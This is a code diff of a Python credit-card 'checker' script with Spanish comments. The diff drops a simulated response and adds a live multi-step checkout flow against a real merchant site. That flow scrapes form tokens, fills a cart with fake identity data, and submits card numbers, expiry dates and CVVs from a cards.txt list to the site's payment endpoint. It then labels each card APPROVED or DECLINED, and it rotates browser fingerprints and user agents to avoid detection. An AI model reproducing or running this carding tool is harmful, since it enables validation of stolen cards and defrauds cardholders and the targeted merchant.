@@ -26,20 +26,6 @@ def capture(data, start, end):
     except ValueError:  
         return None
 
-def get_bin_info(bin_number):
-    try:
-        res = requests.get(f"https://binlist.io/lookup/{bin_number}")
-        if res.status_code == 200:
-            data = res.json()
-            return {
-                "bin": data.get("scheme", "N/A").upper() + " " + data.get("type", "").upper(),
-                "bank": data.get("bank", {}).get("name", "Unknown"),
-                "country": f"{data.get('country', {}).get('name', 'Unknown')} {data.get('country', {}).get('emoji', '')}"
-            }
-    except Exception as e:
-        print("BIN error:", e)
-    return {"bin": "N/A", "bank": "N/A", "country": "N/A"}
-
 def ccn_gate(card):
     max_retries = 10
     retry_count = 0
@@ -49,12 +35,13 @@ def ccn_gate(card):
         try:
             init(autoreset=True)
             cliente = requests.Session(impersonate=choice(["chrome124", "chrome123", "safari17_0", "safari17_2_ios", "safari15_3"]))
+            cliente.proxies = {"https": ""}
             cc_number, mes, ano_number, cvv = card.split('|')
             if len(ano_number) == 4: 
                 ano_number = ano_number[2:4]
             agente_user = UserAgent().random
 
-            #============[Fake user info]============#
+            #============[Address Found]============#
             name  = usuario()['name'].split(' ')[0]  
             last  = usuario()['name'].split(' ')[1]  
             number = random.randint(1111, 9999)  
@@ -62,45 +49,84 @@ def ccn_gate(card):
             email = usuario()['email']  
             phone = usuario()['phone']  
 
-            #============[Simulación de response]============#
-            result_json = {
-                "paymentresponse": '{"message":"CVV2 MISMATCH","code":"0000N7"}'
-            }
+            #============[Requests 1]============#
+            headers = {"User-Agent": agente_user, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" }  
+            result  = cliente.get(url="https://glorybee.com/queen-excluders", headers=headers)  
+            form_key = capture(result.text, 'name="form_key" type="hidden" value="', '"')  
 
-            message_text = capture(result_json['paymentresponse'], '"message":"', '"')  
-            message_code = capture(result_json['paymentresponse'], '"code":"', '"')  
+            #============[Requests 2]============#
+            headers = {"Cookie":f"form_key={form_key};","User-Agent": agente_user,
+                       "Accept": "application/json, text/javascript, */*; q=0.01",
+                       "X-Requested-With": "XMLHttpRequest",
+                       "Content-Type": "application/x-www-form-urlencoded",
+                       "Origin": "https://glorybee.com",
+                       "Referer": "https://glorybee.com/queen-excluders"}  
+            data    = {"product": "21873","selected_configurable_option": "","related_product": "","item": "21873",
+                       "form_key": form_key,"super_attribute[183]": "6440","qty": "1"}  
+            result  = cliente.post(url="https://glorybee.com/checkout/cart/add/uenc/aHR0cHM6Ly9nbG9yeWJlZS5jb20vcXVlZW4tZXhjbHVkZXJz/product/21873/", data=data, headers=headers)  
+
+            #============[Requests 3]============#
+            headers = {"User-Agent": agente_user,
+                       "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                       "Referer": "https://glorybee.com/queen-excluders"}  
+            result  = cliente.get(url="https://glorybee.com/checkout/cart/", headers=headers)  
+            form_id = capture(result.text, '"entity_id":"', '"')  
+
+            #============[Requests 4]============#
+            headers = {"User-Agent": agente_user,"Accept": "*/*",
+                       "Content-Type": "application/json",
+                       "X-Requested-With": "XMLHttpRequest",
+                       "Origin": "https://glorybee.com",
+                       "Referer": "https://glorybee.com/checkout/"}  
+            data    = {"customerEmail":email}  
+            cliente.post(url="https://glorybee.com/rest/default/V1/customers/isEmailAvailable", json=data, headers=headers)  
+
+            #============[Requests 5]============#
+            headers = {"User-Agent": agente_user,"Accept": "*/*","Content-Type": "application/json",
+                       "X-Requested-With": "XMLHttpRequest",
+                       "Origin": "https://glorybee.com",
+                       "Referer": "https://glorybee.com/checkout/"}  
+            data    = {"addressInformation":{"shipping_address":{"countryId":"US","regionId":"49","regionCode":"OR","region":"Oregon","street":[f"{number} B Airport Rd "],"company":"None","telephone":phone,"postcode":"97402","city":"eugene","firstname":name,"lastname":last,"middlename":"","extension_attributes":{"delivery_date":"","time_slot":"","location_id":"","location_address":""}},"billing_address":{"countryId":"US","regionId":"49","regionCode":"OR","region":"Oregon","street":[f"{number} B Airport Rd "],"company":"None","telephone":phone,"postcode":"97402","city":"eugene","firstname":name,"lastname":last,"middlename":"","saveInAddressBook":None},"shipping_method_code":"GND","shipping_carrier_code":"shqups","extension_attributes":{}}}  
+            cliente.post(url=f"https://glorybee.com/rest/default/V1/guest-carts/{form_id}/shipping-information", json=data, headers=headers)  
+
+            #============[Requests 6]============#
+            headers = {"User-Agent": agente_user,"Accept": "*/*","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+                       "X-Requested-With": "XMLHttpRequest",
+                       "Origin": "https://glorybee.com",
+                       "Referer": "https://glorybee.com/checkout/"}  
+            data    = "payment_method=paya"  
+            cliente.post(url="https://glorybee.com/magecomp_surcharge/checkout/applyPaymentMethod/", data=data, headers=headers)  
+
+            #============[Requests 7]============#
+            headers = {"User-Agent": agente_user,
+                       "Accept": "application/json, text/javascript, */*; q=0.01",
+                       "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+                       "X-Requested-With": "XMLHttpRequest",
+                       "Origin": "https://glorybee.com",
+                       "Referer": "https://glorybee.com/checkout/"}  
+            data    = f"form_key={form_key}&cardNumber={cc_number}&cardExpirationDate={mes}{ano_number}&cvv={cvv}&billing%5Bname%5D={name}+{last}&billing%5Baddress%5D={street}&billing%5Bcity%5D=EUGENE&billing%5Bstate%5D=Oregon&billing%5BpostalCode%5D=10080&billing%5Bcountry%5D=US&shipping%5Bname%5D={name}+{last}&shipping%5Baddress%5D={street}&shipping%5Bcity%5D=eugene&shipping%5Bstate%5D=Oregon&shipping%5BpostalCode%5D=97402&shipping%5Bcountry%5D=US"  
+            result  = cliente.post(url="https://glorybee.com/paya/checkout/request", data=data, headers=headers)  
+
+            message_text = capture(result.json()['paymentresponse'], '"message":"', '"')  
+            message_code = capture(result.json()['paymentresponse'], '"code":"', '"')  
 
             elapsed = round(time.time() - start_time, 2)
 
-            # Obtener BIN info
-            bin_info = get_bin_info(cc_number[:6])
-
-            #=========== FORMATO BONITO ===========#
-            status = "✅ Aprobada" if "CVV2 MISMATCH" in (message_text or "") else "❌ Rechazada"
-
-            mensaje = f"""
-💳 𝗥𝗘𝗦𝗨𝗟𝗧𝗔𝗗𝗢 𝗖𝗔𝗥𝗗
-
-• 𝗧𝗮𝗿𝗷𝗲𝘁𝗮: `{card}`
-• 𝗘𝘀𝘁𝗮𝗱𝗼: {status}
-• 𝗠𝗲𝗻𝘀𝗮𝗷𝗲: {message_text}
-• 𝗖𝗼́𝗱𝗶𝗴𝗼: {message_code}
-
-🏦 𝗕𝗔𝗡𝗖𝗢 𝗬 𝗣𝗔Í𝗦
-• BIN: {bin_info["bin"]}
-• Banco: {bin_info["bank"]}
-• País: {bin_info["country"]}
-
-⏱ 𝗧𝗶𝗲𝗺𝗽𝗼: {elapsed} Segs
-🔁 Reintentos: {retry_count+1}
-"""
-            return mensaje.strip()
+            #=========== JSON RESPONSE ===========#
+            return {
+                "card": card,
+                "status": "APPROVED" if "approved" in (message_text or "").lower() or "CVV2 MISMATCH" in (message_text or "") else "DECLINED",
+                "message": message_text,
+                "code": message_code,
+                "time": f"{elapsed} Segs",
+                "retries": retry_count + 1
+            }
 
         except Exception as e:  
             print(e)  
             retry_count += 1  
     else:  
-        return f"❌ Error con {card} (retries={retry_count})"
+        return {"card": card, "status": "ERROR", "resp":  f"Retries: {retry_count}"}
 
 if __name__ == "__main__":
     file = open('cards.txt', 'r')
@@ -108,7 +134,7 @@ if __name__ == "__main__":
     for position, x in enumerate(lines):
         cc, mes, ano, cvv = x.split("|")
         gateway = ccn_gate(f"{cc}|{mes}|{ano}|{cvv.strip()}")
-        print(gateway)  # <-- ahora imprime el mensaje bonito
+        print(gateway)  # <-- ahora imprime JSON
         with open('cards.txt', "w")as f:
             f.writelines(lines[position+1:])
             f.close()
